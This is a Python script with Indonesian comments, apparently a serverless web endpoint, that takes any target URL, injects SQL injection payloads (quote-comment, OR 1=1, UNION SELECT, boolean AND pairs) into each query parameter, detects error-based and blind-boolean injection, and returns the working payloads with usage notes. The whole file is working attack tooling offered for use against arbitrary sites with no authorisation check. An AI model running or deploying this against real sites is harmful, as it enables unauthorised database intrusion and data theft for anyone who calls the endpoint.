#!/usr/bin/env python3
# api/scan.py – Vercel serverless function
# Menunjukkan payload mana yang WORK + cara pakainya
import urllib.parse, json, socket, ssl, sys

# ===== CONFIG =====
TIMEOUT = 5
PAYLOADS = [
    ("error-based",  "'-- -"),
    ("error-based",  "' OR 1=1-- -"),
    ("union-based",  "' UNION SELECT 1,2,3-- -"),
    ("blind-boolean","' AND 1=1-- -"),
    ("blind-boolean","' AND 1=2-- -")
]
# ==================

def send_get(url):
    p = urllib.parse.urlparse(url)
    host, port = p.hostname, 443 if p.scheme == 'https' else 80
    path_and_query = p.path + ('?' + p.query if p.query else '')
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(TIMEOUT)
    if p.scheme == 'https':
        sock = ssl.create_default_context().wrap_socket(sock, server_hostname=host)
    sock.connect((host, port))
    req = f"GET {path_and_query} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
    sock.send(req.encode())
    resp = sock.recv(8192).decode(errors='ignore')
    sock.close()
    return resp

def scan(url):
    base_url = url.split('?')[0]
    qs = dict(urllib.parse.parse_qsl(urllib.parse.urlparse(url).query))
    if not qs:
        return {"status":"error","detail":"URL harus punya query string (misal ?id=1)"}

    results = []
    vuln_found = False

    for param in qs:
        original_value = qs[param]
        for mode, payload in PAYLOADS:
            qs[param] = original_value + payload
            injected_url = base_url + '?' + urllib.parse.urlencode(qs)
            try:
                resp = send_get(injected_url)
                lower = resp.lower()
                # Cek error-based
                if any(e in lower for e in ["mysql","syntax","warning","error"]) and mode == "error-based":
                    vuln_found = True
                    results.append({
                        "payload": injected_url,
                        "mode": mode,
                        "status": "vuln",
                        "note": "MySQL error terlihat → error-based SQLi confirmed"
                    })
                # Cek blind-boolean
                elif mode == "blind-boolean":
                    true_resp  = send_get(base_url + '?' + urllib.parse.urlencode({**qs, param: original_value + "' AND 1=1-- -"}))
                    false_resp = send_get(base_url + '?' + urllib.parse.urlencode({**qs, param: original_value + "' AND 1=2-- -"}))
                    if len(true_resp) != len(false_resp):
                        vuln_found = True
                        results.append({
                            "payload": base_url + '?' + urllib.parse.urlencode({**qs, param: original_value + "' AND [CONDITION]-- -"}),
                            "mode": mode,
                            "status": "vuln",
                            "note": "Perbedaan panjang respon → blind-boolean SQLi"
                        })
            except Exception as e:
                results.append({"payload": injected_url, "status": "error", "detail": str(e)})
            finally:
                qs[param] = original_value  # reset

    if vuln_found:
        return {"status":"vuln","payloads":results}
    else:
        return {"status":"safe","detail":"Semua payload tidak memicu vuln yang jelas"}

def handler(event, context=None):
    url = urllib.parse.parse_qs(event.get('queryString', '')).get('url', [''])[0]
    if not url:
        return {"statusCode": 400, "body": json.dumps({"status":"error","detail":"url param wajib"})}
    result = scan(url)
    return {"statusCode": 200, "body": json.dumps(result, indent=2)}

# Untuk test lokal (python3 scan.py https://...)
if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: python3 scan.py https://target.com/page?id=1")
    else:
        print(json.dumps(scan(sys.argv[1]), indent=2))
